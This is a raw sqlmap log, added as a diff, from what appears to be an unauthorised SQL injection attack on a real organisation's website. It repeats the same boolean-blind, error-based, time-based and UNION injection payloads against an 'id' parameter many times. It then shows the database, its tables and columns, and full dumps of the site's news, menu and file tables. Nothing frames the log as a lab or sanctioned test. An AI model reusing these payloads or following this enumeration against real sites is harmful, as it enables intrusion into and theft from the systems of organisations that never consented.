@@ -1,0 +1,344 @@
+sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=18 AND 5135=5135
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=18 AND EXTRACTVALUE(8581,CONCAT(0x5c,0x7176787671,(SELECT (ELT(8581=8581,1))),0x717a626271))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=18 AND (SELECT 4214 FROM (SELECT(!SLEEP(5)))JAFw)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-6670 UNION ALL SELECT NULL,NULL,CONCAT(0x7176787671,0x50535879594c464b52416a476252426f6e6e564e6f5242546b626159454771574d656e7241446464,0x717a626271),NULL,NULL,NULL,NULL,NULL-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=18 AND 5135=5135
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=18 AND EXTRACTVALUE(8581,CONCAT(0x5c,0x7176787671,(SELECT (ELT(8581=8581,1))),0x717a626271))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=18 AND (SELECT 4214 FROM (SELECT(!SLEEP(5)))JAFw)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-6670 UNION ALL SELECT NULL,NULL,CONCAT(0x7176787671,0x50535879594c464b52416a476252426f6e6e564e6f5242546b626159454771574d656e7241446464,0x717a626271),NULL,NULL,NULL,NULL,NULL-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=18 AND 5135=5135
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=18 AND EXTRACTVALUE(8581,CONCAT(0x5c,0x7176787671,(SELECT (ELT(8581=8581,1))),0x717a626271))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=18 AND (SELECT 4214 FROM (SELECT(!SLEEP(5)))JAFw)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-6670 UNION ALL SELECT NULL,NULL,CONCAT(0x7176787671,0x50535879594c464b52416a476252426f6e6e564e6f5242546b626159454771574d656e7241446464,0x717a626271),NULL,NULL,NULL,NULL,NULL-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=18 AND 5135=5135
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=18 AND EXTRACTVALUE(8581,CONCAT(0x5c,0x7176787671,(SELECT (ELT(8581=8581,1))),0x717a626271))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=18 AND (SELECT 4214 FROM (SELECT(!SLEEP(5)))JAFw)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-6670 UNION ALL SELECT NULL,NULL,CONCAT(0x7176787671,0x50535879594c464b52416a476252426f6e6e564e6f5242546b626159454771574d656e7241446464,0x717a626271),NULL,NULL,NULL,NULL,NULL-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL 5 (MariaDB fork)
+available databases [2]:
+[*] csiindia65_csiindia
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=18 AND 5135=5135
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=18 AND EXTRACTVALUE(8581,CONCAT(0x5c,0x7176787671,(SELECT (ELT(8581=8581,1))),0x717a626271))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=18 AND (SELECT 4214 FROM (SELECT(!SLEEP(5)))JAFw)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-6670 UNION ALL SELECT NULL,NULL,CONCAT(0x7176787671,0x50535879594c464b52416a476252426f6e6e564e6f5242546b626159454771574d656e7241446464,0x717a626271),NULL,NULL,NULL,NULL,NULL-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL 5 (MariaDB fork)
+available databases [2]:
+[*] csiindia65_csiindia
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=18 AND 5135=5135
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=18 AND EXTRACTVALUE(8581,CONCAT(0x5c,0x7176787671,(SELECT (ELT(8581=8581,1))),0x717a626271))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=18 AND (SELECT 4214 FROM (SELECT(!SLEEP(5)))JAFw)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-6670 UNION ALL SELECT NULL,NULL,CONCAT(0x7176787671,0x50535879594c464b52416a476252426f6e6e564e6f5242546b626159454771574d656e7241446464,0x717a626271),NULL,NULL,NULL,NULL,NULL-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL 5 (MariaDB fork)
+Database: csiindia65_csiindia
+[4 tables]
++----------------------+
+| category             |
+| menu                 |
+| news                 |
+| upload_file_category |
++----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=18 AND 5135=5135
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=18 AND EXTRACTVALUE(8581,CONCAT(0x5c,0x7176787671,(SELECT (ELT(8581=8581,1))),0x717a626271))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=18 AND (SELECT 4214 FROM (SELECT(!SLEEP(5)))JAFw)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-6670 UNION ALL SELECT NULL,NULL,CONCAT(0x7176787671,0x50535879594c464b52416a476252426f6e6e564e6f5242546b626159454771574d656e7241446464,0x717a626271),NULL,NULL,NULL,NULL,NULL-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL 5 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=18 AND 5135=5135
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=18 AND EXTRACTVALUE(8581,CONCAT(0x5c,0x7176787671,(SELECT (ELT(8581=8581,1))),0x717a626271))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=18 AND (SELECT 4214 FROM (SELECT(!SLEEP(5)))JAFw)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-6670 UNION ALL SELECT NULL,NULL,CONCAT(0x7176787671,0x50535879594c464b52416a476252426f6e6e564e6f5242546b626159454771574d656e7241446464,0x717a626271),NULL,NULL,NULL,NULL,NULL-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL 5 (MariaDB fork)
+Database: csiindia65_csiindia
+Table: upload_file_category
+[9 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| doc_file_name | varchar(200) |
+| file_date     | date         |
+| file_id       | int(11)      |
+| file_title    | varchar(200) |
+| main_cat_id   | int(11)      |
+| pdf_file_name | varchar(200) |
+| pub_month     | int(11)      |
+| pub_year      | int(11)      |
+| serial_no     | int(11)      |
++---------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=18 AND 5135=5135
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=18 AND EXTRACTVALUE(8581,CONCAT(0x5c,0x7176787671,(SELECT (ELT(8581=8581,1))),0x717a626271))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=18 AND (SELECT 4214 FROM (SELECT(!SLEEP(5)))JAFw)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-6670 UNION ALL SELECT NULL,NULL,CONCAT(0x7176787671,0x50535879594c464b52416a476252426f6e6e564e6f5242546b626159454771574d656e7241446464,0x717a626271),NULL,NULL,NULL,NULL,NULL-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL 5 (MariaDB fork)
+Database: csiindia65_csiindia
+Table: upload_file_category
+[9 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| doc_file_name | varchar(200) |
+| file_date     | date         |
+| file_id       | int(11)      |
+| file_title    | varchar(200) |
+| main_cat_id   | int(11)      |
+| pdf_file_name | varchar(200) |
+| pub_month     | int(11)      |
+| pub_year      | int(11)      |
+| serial_no     | int(11)      |
++---------------+--------------+
+
+Database: csiindia65_csiindia
+Table: upload_file_category
+[8 entries]
++---------+-------------+----------+------------+-----------+-----------+----------------------------------------------------------------+--------------------------------------------+----------------------------------------------------------------------------------------------------------+
+| file_id | main_cat_id | pub_year | file_date  | pub_month | serial_no | file_title                                                     | doc_file_name                              | pdf_file_name                                                                                            |
++---------+-------------+----------+------------+-----------+-----------+----------------------------------------------------------------+--------------------------------------------+----------------------------------------------------------------------------------------------------------+
+| 1       | 1           | 0        | 2018-07-08 | 0         | 0         | Certificate of Registration of CSI                             | <blank>                                    | Certificate of Registration of CSI.pdf                                                                   |
+| 2       | 1           | 0        | 2018-07-08 | 0         | 0         | CSI Constitution  Byelaws January  2009                        | <blank>                                    | CSI Constitution  Byelaws January  2009.pdf                                                              |
+| 3       | 1           | 0        | 2018-07-08 | 0         | 0         | CSI Constitution and Byelaws  2013                             | <blank>                                    | CSI Constitution and Byelaws  2013.pdf                                                                   |
+| 4       | 1           | 0        | 2018-07-05 | 0         | 0         | Institutional Membership                                       | <blank>                                    | FORM I - Application for Institutional  Acad and Non Acad Membership  Version 2.4 w.e.f.  01.07.2017.pdf |
+| 5       | 1           | 0        | 2018-07-05 | 0         | 0         | Individual or Life Membership                                  | <blank>                                    | Form II - Application for Individual or Life Membership  Version 2.6 w. e. f. 02.04.2018.pdf             |
+| 6       | 1           | 0        | 2018-07-05 | 0         | 0         | Accredited Student Wing                                        | <blank>                                    | FORM III - Application for CSI Accreditation-Version.3.0.pdf                                             |
+| 7       | 1           | 0        | 2018-07-05 | 0         | 0         | Renewal Individual Membership                                  | <blank>                                    | Application for Renewal Individual Membership w.e.f 02.04.2018.pdf                                       |
+| 8       | 1           | 2022     | 2022-05-09 | 5         | 8         | Final CALL for Nominations for 2021-2022/2023 and 2022-2023/24 | FinalCall for Nominations Final 222324.doc | finalcall for nominations final 2223244.pdf                                                              |
++---------+-------------+----------+------------+-----------+-----------+----------------------------------------------------------------+--------------------------------------------+----------------------------------------------------------------------------------------------------------+
+
+Database: csiindia65_csiindia
+Table: menu
+[7 entries]
++---------+----------------+--------------------------------------------------------+-----------+------------------------------------------------------+-------------+--------------+
+| menu_id | parent_menu_id | fa_class                                               | serial_no | menu_title                                           | menu_status | path_to_page |
++---------+----------------+--------------------------------------------------------+-----------+------------------------------------------------------+-------------+--------------+
+| 1       | 0              | <i class="fa fa-sticky-note-o" aria-hidden="true"></i> | 1         | News<img src="https://csi-india.org/images/new.gif"> | Active      | news         |
+| 2       | 0              | <i class="fa fa-home" aria-hidden="true"></i>          | 2         | Home                                                 | Active      | <blank>      |
+| 3       | 0              | <i class="fa fa-globe" aria-hidden="true"></i>         | 3         | About us                                             | Active      | about        |
+| 4       | 0              | <i class="fa fa-user" aria-hidden="true"></i>          | 4         | CSI NC                                               | Active      | maintenance  |
+| 5       | 0              | <i class="fa fa-thumbs-up"  aria-hidden="true"></i>    | 5         | Elections<img src="/images/new.gif">                 | InActive    | maintenance  |
+| 6       | 0              | <i class="fa fa-download" aria-hidden="true"></i>      | 6         | Downloads                                            | Active      | downloads    |
+| 7       | 0              | <i class="fa fa-envelope" aria-hidden="true"></i>      | 7         | Contact us                                           | Active      | contact      |
++---------+----------------+--------------------------------------------------------+-----------+------------------------------------------------------+-------------+--------------+
+
+Database: csiindia65_csiindia
+Table: category
+[1 entry]
++--------+---------------+-----------+
+| cat_id | parent_cat_id | cat_name  |
++--------+---------------+-----------+
+| 1      | 0             | downloads |
++--------+---------------+-----------+
+
+Database: csiindia65_csiindia
+Table: news
+[12 entries]
++---------+--------------------------------------------+---------------------+-----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+--------------------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| news_id | file_doc                                   | news_date           | serial_no | news_title                                                                                                                                                                                                                                | news_status | news_file_path                             | news_description                                                                                                                                                                    |
++---------+--------------------------------------------+---------------------+-----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+--------------------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 13      | <blank>                                    | 2022-05-06 00:00:00 | 0         | Order of Hon' ble High Court of Bombay dated 22-04-2022                                                                                                                                                                                   | Active      | CSI HC Order dt 22-04-2022.pdf             | Order of Hon' ble High Court of Bombay dated 22-04-2022                                                                                                                             |
+| 14      | FinalCall for Nominations Final 222324.doc | 2022-05-09 00:00:00 | 14        | CALL For Nominations for CSI National Elections for remaining period of odd years 2021-2022/2023 and for even year2022-2023/24                                                                                                            | Active      | FinalCall for Nominations Final 222324.pdf | CALL For Nominations for CSI National Elections for remaining period of odd years 2021-2022/2023 and for even year2022-2023/24. Please download the following file for the details: |
+| 15      | NULL                                       | 2022-06-16 00:00:00 | 15        | Communication to the General  Body of the list of members nominated for various posts for the election to be  held for 2022-2023/2024 (Before Withdrawal Process)                                                                         | Active      | <blank>                                    | ...                                                                                                                                                                                 |
+| 16      | NULL                                       | 2022-06-17 00:00:00 | 16        | Short Listed Applications before withdrawal-done on 10th/11th June 2022 \n                                                                                                                                                                | Active      | <blank>                                    | For The following posts candidate details -                                                                                                                                         |
+| 17      | NULL                                       | 2022-06-30 00:00:00 | 17        | Short Listed Applications after withdrawal-done on 23rd June 2022 <br>\n<a href="http://csi-india.org/Election-22-24/el_index.php">click here for details </a>                                                                            | Active      | <blank>                                    | Bio-Data of candidates for the following posts                                                                                                                                      |
+| 18      | NULL                                       | 2023-06-03 00:00:00 | 18        | Message from TMC to all CSI members requesting all members to verify their Email Id and mobile numbers at the earliest.<br>\n<a href="http://csi-india.org/Election-22-24/Message2allmembers-3-6-23.pdf">click here for details </a>      | Active      | <blank>                                    | Message from TMC to all CSI members requesting all members to verify their Email Id and mobile numbers at the earliest.                                                             |
+| 19      | NULL                                       | 2023-06-12 00:00:00 | 19        | CSI Interim Report cum instructions by Justice R.M. Savant (Retired) against A.O. 111/2022 as per directions of the Bombay High Court\n<br>\n<a href="http://csi-india.org/Election-22-24/Report-12-6-23.pdf">click here for details </a> | Active      | <blank>                                    | CSI Interim Report cum instructions by Justice R.M. Savant (Retired) against A.O. 111/2022 as per directions of the Bombay High Court                                               |
+| 20      | NULL                                       | 2023-07-08 00:00:00 | 20        | Verification drive of CSI members by M/S CPGBPM, Call Centre \n<br>\n<a href="http://csi-india.org/Election-22-24/Verification_drive_CSI.pdf">click here for details </a>                                                                 | Active      | <blank>                                    | Verification drive of CSI members by M/S CPGBPM, Call Centre                                                                                                                        |
+| 21      | NULL                                       | 2026-10-21 00:00:00 | 21        | Order of Hon' ble High Court of Bombay dated 07/09/2026 of Justice Aarti Sathe\r\n<br>\r\n<a href="http://csi-india.org/Election-22-24/Justice Aarti Sathe Order of 7 Sept 2026.pdf">click here for details </a>                          | Active      | <blank>                                    | Order of Hon' ble High Court of Bombay dated 07/09/2026 of Justice Aarti Sathe                                                                                                      |
+| 22      | NULL                                       | 2026-10-21 00:00:00 | 22        | Communication to Members on Auditor Appointment\r\n<br>\r\n<a href="http://csi-india.org/Election-22-24/Communication to Members on Auditor Appointment.pdf">click here for details </a>                                                  | Active      | <blank>                                    | Communication to Members on Auditor Appointment                                                                                                                                     |
+| 23      | NULL                                       | 2026-10-28 00:00:00 | 23        | Communication to Chapter Office Bearers\r\n<br>\r\n<a href="http://csi-india.org/Docs_2026/Communication to Chapter Office bearers.pdf">click here for details </a>                                                                       | Active      | <blank>                                    | Communication to Chapter Office Bearers                                                                                                                                             |
+| 24      | NULL                                       | 2026-10-28 00:00:00 | 24        | Request for Information and Records from Chapters\r\n<br>\r\n<a href="http://csi-india.org/Docs_2026/Request for Information and records from Chapters.pdf">click here for details </a>                                                   | Active      | <blank>                                    | Request for Information and Records from Chapters                                                                                                                                   |
++---------+--------------------------------------------+---------------------+-----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+--------------------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=18 AND 5135=5135
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=18 AND EXTRACTVALUE(8581,CONCAT(0x5c,0x7176787671,(SELECT (ELT(8581=8581,1))),0x717a626271))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=18 AND (SELECT 4214 FROM (SELECT(!SLEEP(5)))JAFw)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-6670 UNION ALL SELECT NULL,NULL,CONCAT(0x7176787671,0x50535879594c464b52416a476252426f6e6e564e6f5242546b626159454771574d656e7241446464,0x717a626271),NULL,NULL,NULL,NULL,NULL-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL 5 (MariaDB fork)
+No tables found
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=18 AND 5135=5135
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=18 AND EXTRACTVALUE(8581,CONCAT(0x5c,0x7176787671,(SELECT (ELT(8581=8581,1))),0x717a626271))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=18 AND (SELECT 4214 FROM (SELECT(!SLEEP(5)))JAFw)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-6670 UNION ALL SELECT NULL,NULL,CONCAT(0x7176787671,0x50535879594c464b52416a476252426f6e6e564e6f5242546b626159454771574d656e7241446464,0x717a626271),NULL,NULL,NULL,NULL,NULL-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL 5 (MariaDB fork)
+No tables found
